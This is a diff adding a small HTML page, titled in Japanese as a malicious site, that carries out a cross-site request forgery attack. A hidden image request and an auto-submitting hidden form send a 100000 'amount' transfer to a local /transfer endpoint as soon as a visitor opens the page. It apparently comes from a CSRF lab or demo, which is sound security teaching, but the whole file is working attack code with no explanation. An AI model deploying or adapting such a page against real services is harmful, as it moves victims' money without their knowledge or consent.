@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>悪意のあるサイト</title>
+</head>
+<body>
+    <h2>ここには何もないよ :)</h2>
+    
+    <!-- 自動送金 -->
+    <img src="http://localhost:5000/transfer" style="display:none;">
+    
+    <!-- フォームを自動送信するJavaScript -->
+    <script>
+        window.onload = function() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "http://localhost:5000/transfer";
+
+            var hiddenField = document.createElement("input");
+            hiddenField.type = "hidden";
+            hiddenField.name = "amount";
+            hiddenField.value = "100000";
+
+            form.appendChild(hiddenField);
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+</body>
+</html>
